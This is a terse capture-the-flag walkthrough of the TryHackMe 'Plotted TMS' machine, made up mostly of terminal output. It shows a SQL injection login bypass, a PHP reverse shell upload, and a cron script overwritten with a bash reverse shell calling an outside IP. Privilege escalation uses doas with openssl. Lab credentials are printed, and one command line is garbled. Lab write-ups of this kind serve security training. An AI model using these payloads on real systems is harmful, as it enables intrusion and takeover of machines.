---
title: Plotted Tms
date: '2024-12-30'
category: tryhackme
tags: tryhackme, ctf
description: Detailed technical walkthrough and security analysis for the Plotted
  Tms machine on TryHackMe.
slug: plotted-tms
---




```
PORT    STATE SERVICE REASON         VERSION
22/tcp  open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
445/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))

```

```
http://10.66.179.166/passwd

`bm90IHRoaXMgZWFzeSA6RA==`
```

```
http://10.66.179.166/admin/id_rsa

`VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE`
```

```
http://10.66.179.166:445/management/admin/login.php
```

> This login forum injectable i use `' or 1=1 -- -` and can be login and I add and run phpreverseshell

```
www-data@plotted:/home/plot_admin$ cat user.txt
cat: user.txt: Permission denied

```

```
www-data@plotted:/var/www/scripts$ cat /etc/crontab

# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   plot_admin /var/www/scripts/backup.sh
#

```

```
www-data@plotted:/var/www/html/445/management$ cat initialize.php
<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');
if(!defined('base_url')) define('base_url','/management/');
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"tms_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"Password@123");
if(!defined('DB_NAME')) define('DB_NAME',"tms_db");
?>

```

```
www-data@plotted:/var/www/scripts$ ls
backup.sh
```

```
www-data@plotted:/var/www/scripts$ rm backup.sh
rm: remove write-protected regular file 'backup.sh'? yes
www-data@plotted:/var/www/scripts$ ls
www-data@plotted:/var/www/scripts$ set +H
www-data@plotted:/var/www/scripts$ echo '#!/bin/bash
> bash -i >& /dev/tcp/192.168.153.193/4444 0>&1' > backup.sh
www-data@plotted:/var/www/scripts$ chmod +x backup.sh
www-data@plotted:/var/www/scripts$ ls -la
total 12
drwxr-xr-x 2 www-data www-data 4096 Dec 21 08:27 .
drwxr-xr-x 4 root     root     4096 Oct 28  2021 ..
-rwxrwxrwx 1 www-data www-data   58 Dec 21 08:27 backup.sh
www-data@plotted:/var/www/scripts$ ./backup.sh

```

> Wait Few Seconds...

```
user.txt
plot_admin@plotted:~$ cat user.txt

```

```
find / -user root -perm /4000
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/chfn
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/umount
/usr/bin/doas
/usr/bin/newgrp

```

```
 cat /etc/doas.conf 
permit nopass plot_admin as root cmd openssl
plot_admin@plotted:/$ LFILE=/etc/passwd
<sh” | doas -u root openssl enc -out “$LFILE”|
> ^C
plot_admin@plotted:/$ doas openssl enc -in "/root/root.txt"
Congratulations on completing this room!

53f85e2da...............

Hope you enjoyed the journey!

Do let me know if you have any ideas/suggestions for future rooms.

```